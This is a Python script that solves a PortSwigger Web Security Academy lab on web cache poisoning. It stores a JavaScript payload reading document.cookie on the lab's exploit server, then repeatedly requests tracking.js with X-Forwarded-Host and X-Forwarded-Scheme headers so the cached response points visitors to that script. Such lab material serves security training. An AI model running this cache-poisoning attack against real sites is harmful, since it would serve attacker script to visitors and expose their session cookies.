#############################################################################
#
# Lab: Web cache poisoning with multiple headers
#
# Hack Steps:
#      1. Store the malicious javascript file on your expoit server
#      2. Send multiple request to the tracking.js file with multiple
#         headers, one causes a redirect and the other makes the redirect 
#         point to your exploit server
#      3. The main page will be poisoned as it request the tracking.js file
#
#############################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0ac500a804de8527800544fe006d0085.web-security-academy.net" 

# Change this to your exploit server DOMAIN
EXPLOIT_SERVER_DOMAIN = "exploit-0aa300cd04b2850e80c543f001650096.exploit-server.net" 

def main():
    print("⦗1⦘ Storing the malicious javascript file on your exploit server.. ", end="", flush=True)

    response_head = "HTTP/1.1 200 OK\r\nContent-Type: application/javascript; charset=utf-8"
    js_file = "alert(document.cookie);"
    data = { "responseFile": "/resources/js/tracking.js", "responseBody": js_file, "responseHead": response_head, "formAction": "STORE", "urlIsHttps": "on" }
    post_data(F"https://{EXPLOIT_SERVER_DOMAIN}", data)

    print(Fore.GREEN + "OK")

    # 5 times is enough for caching
    # 30 times to reach the max-age and start caching again (just to make sure that the request is cached to mark the lab as solved)
    for counter in range(1,31):
        print(Fore.WHITE + f"⦗2⦘ Poisoning the tracking.js file with multiple headers ({counter}/30).. ", end="\r", flush=True)
        
        headers = { "X-Forwarded-Host": EXPLOIT_SERVER_DOMAIN, "X-Forwarded-Scheme": "http" }
        requests.get(f"{LAB_URL}/resources/js/tracking.js", headers=headers)

    print(Fore.WHITE + "⦗2⦘ Poisoning the tracking.js file with multiple headers (30/30).." + Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The main page is poisoned successfully as it request the tracking.js file")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def post_data(url, data):
    try:    
        return requests.post(url, data, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + url + " through exception")
        exit(1)


if __name__ == "__main__":
    main()